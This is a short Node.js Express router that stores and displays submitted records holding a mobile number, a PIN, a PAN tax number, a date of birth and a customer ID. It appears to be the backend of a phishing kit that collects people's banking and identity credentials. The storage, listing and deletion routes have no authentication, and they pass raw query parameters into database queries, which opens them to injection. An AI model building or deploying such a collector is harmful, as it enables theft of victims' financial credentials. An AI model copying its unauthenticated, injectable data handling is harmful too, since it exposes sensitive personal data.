const express = require('express');
const router = express.Router();
const DataModel = require('./dataModel');
const hbs = require('hbs');

router.post('/uploadData', async (req, res) => {
  try {
    const {mno, pin, pan, dob, cid} = req.body;
    const newData = new DataModel({
      mno, pin, pan, dob, cid
    });

    const result = await newData.save();
    res.status(200).json(result);

  } catch (error) {
    console.error('Error while uploading data:', error);
    res.status(500).json({ message: 'Failed to upload data' });
  }
});

router.get('/delete', async (req, res) => {
  try {
    const {mno, pin, pan, dob, cid} = req.body;
    const newData = new DataModel({
      mno, pin, pan, dob, cid
    });

    await DataModel.deleteOne(req.query);
    res.status(200).redirect('/api/data');

  } catch (error) {
    console.error('Error while deleting data:', error);
    res.status(500).json({ message: 'Failed to delete data' });
  }
});


router.get('/data', async (req, res) => {
  try{
    const page = parseInt(req.query.page) || 1; 
  const itemsPerPage = parseInt(req.query.limit) || 50;

  delete req.query.page;
  delete req.query.limit;
  delete req.query.reload;
  if(req.query.mno == ""){
    delete req.query.mno;
  }

  const count = await DataModel.countDocuments(req.query); 
    const totalPages = Math.ceil(count / itemsPerPage);
    const skip = (page - 1) * itemsPerPage;

    const latestData = await DataModel.find(req.query)
      .sort({ _id: -1 })
      .skip(skip)
      .limit(itemsPerPage);
  const pageNumbers = Array.from({ length: totalPages }, (_, index) => index + 1);
  if(pageNumbers.length>5) pageNumbers.length=5; 
  const pagination = {
    current: parseInt(page),
    totalPages
  };

  res.render('index', { data: latestData, pagination, pageNumbers, itemsPerPage});
  }catch(error){
    res.send(error.message);
  }
});

module.exports = router;
